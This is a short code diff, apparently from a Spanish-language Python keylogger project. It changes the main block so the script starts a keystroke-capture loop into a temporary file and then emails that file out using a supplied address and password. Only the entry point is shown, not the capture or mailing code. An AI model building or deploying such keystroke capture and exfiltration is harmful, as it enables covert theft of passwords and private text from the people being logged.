@@ -16,15 +16,17 @@ parser.add_argument("-b", "--buffer", type=int, default=1024, help="Tamaño del 
 argParser = parser.parse_args()
 
 if __name__ == "__main__":
-    try:
-        KeyIntercept(
-            temp_file=argParser.file_temp,
-            buffer_size=argParser.buffer)
-        send_content_file(
-            file_name=argParser.file_temp,
-            email=argParser.email,
-            subject=argParser.subject)
-    except KeyboardInterrupt:
-        print("Programa finalizado por el usuario")
-    except Exception as e:
-        print("Excepción no controlada", e)
+    # try:
+    key_intercept = KeyIntercept(
+        temp_file=argParser.file_temp,
+        buffer_size=argParser.buffer)
+    key_intercept.init_loop()
+    send_content_file(
+        file_name=argParser.file_temp,
+        email=argParser.email,
+        passwd=argParser.passwd,
+        subject=argParser.subject)
+# except KeyboardInterrupt:
+#     print("Programa finalizado por el usuario")
+# except Exception as e:
+#     print("Excepción no controlada", e)
